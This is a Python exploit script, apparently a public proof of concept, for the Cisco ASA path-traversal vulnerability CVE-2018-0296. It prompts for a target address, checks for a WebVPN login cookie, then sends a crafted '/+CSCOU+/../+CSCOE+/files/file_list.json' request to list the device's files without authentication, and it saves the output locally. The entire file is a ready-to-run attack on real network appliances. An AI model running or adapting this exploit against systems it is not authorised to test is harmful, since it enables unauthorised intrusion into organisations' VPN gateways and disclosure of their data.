import os
import requests
import sys
import json

#Colors
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[32m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

requests.packages.urllib3.disable_warnings()

os.system('clear')
directory = "/+CSCOE+/logon.html"
path_exploit = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/"

print("""
  *-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-*

	Cisco ASA | CVE-2018-0296
  Exploit made by: \033[93mbhenner_\033[0m (@bhenner_)

  *-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-*
    """)

url = raw_input("  Vulnerable \033[93mURL\033[0m / \033[93mIP\033[0m - ")
ip = url

try:
	r = requests.get("https://"+url,directory,verify=False, allow_redirects=False, timeout=5)
except Exception as e:
	print("\n  [\033[91m-\033[0m] No Connection with Target, exiting ...\n")
	sys.exit(1)
print("\n  [\033[32m+\033[0m] Got Connection with Target, let's do this!")

url = url + path_exploit;

if "webvpnlogin" in r.cookies:
	try:
		r_exploit = requests.get("https://"+url, verify=False, allow_redirects=False, timeout=5)
	except Exception as e:
		print("\n  [\033[91m+\033[0m] Not Vulnerable ... feels bad.\n")
		sys.exit(1)

	if r_exploit.status_code == 200:

		print("  [\033[32m+\033[0m] Vulnerable! Files returned: \n")
		exploit_files = r_exploit.text;
		print("\n"+exploit_files)

		with open(ip+".txt", "w") as files:
			files.write(r_exploit.text)

		print("  [\033[32m+\033[0m] Results saved to "+ip+".txt file!\n")
else:
	print("  [\033[91m+\033[0m] Target is not Cisco ASAS ... exiting ...\n")
	sys.exit(1)
